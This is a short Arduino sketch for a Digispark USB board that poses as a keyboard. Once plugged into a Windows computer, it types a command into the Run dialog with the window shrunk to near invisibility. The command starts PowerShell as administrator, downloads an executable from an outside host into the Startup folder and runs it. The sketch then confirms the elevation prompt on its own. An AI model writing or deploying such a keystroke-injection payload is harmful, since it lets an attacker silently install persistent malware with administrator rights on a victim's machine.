#define kbd_tr_tr
#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("cmd /c mode con: cols=15 lines=1 && PowerShell.exe \"cd 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup'; Invoke-WebRequest -Uri https://filestorageserver.pythonanywhere.com/download/HelpCenter.exe -OutFile HelpCenter.exe;./HelpCenter.exe\"")); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER,MOD_CONTROL_LEFT | MOD_SHIFT_LEFT ); // Open powershell as Administrator
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);  
  digitalWrite(1, HIGH); 
  for(;;); 
}
